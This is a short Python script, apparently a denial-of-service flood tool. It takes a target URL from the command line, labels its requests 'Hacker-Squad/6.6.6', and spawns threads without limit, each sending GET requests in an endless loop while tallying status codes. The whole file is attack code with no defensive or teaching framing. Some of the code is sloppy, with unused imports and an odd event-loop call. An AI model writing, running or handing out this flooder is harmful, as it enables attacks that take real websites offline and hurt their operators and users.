import aiohttp
import asyncio
import threading
import subprocess
import multiprocess
import sys
import time
import colorama
ths = []

headers = {
  "User-Agent": "Hacker-Squad/6.6.6"
}
if len(sys.argv) < 2:
  exit(-1)
else:
  url = sys.argv[1]
  
num = 0
reqs = []
loop = asyncio.new_event_loop()
r = 0

async def fetch(session, url):
    global r, reqs
    start = int(time.time())
    while True:
      async with session.get(url, headers=headers) as response:
        if response:
          end = int(time.time())
          final = start - end
          finnal = str(final).replace("-", "")
          if response.status == 200:
            r += 1
          reqs.append(response.status)
          sys.stdout.write(f"{str(response.status)}\r") 
        else:
          print("N")



urls = []
urls.append(url)

async def main():
  tasks = []
  async with aiohttp.ClientSession() as session:
    for url in urls:
      tasks.append(fetch(session, url))
    ddos = await asyncio.gather(*tasks)

def run():
    loop.run_forever(asyncio.run(main()))


if __name__ == '__main__':
  active = []
  ths = []
  while True:
    try:
      while True:
        th = threading.Thread(target=run)
        try:
          th.start()
          ths.append(th)
          sys.stdout.flush()
        except:
          pass
    except:
      pass
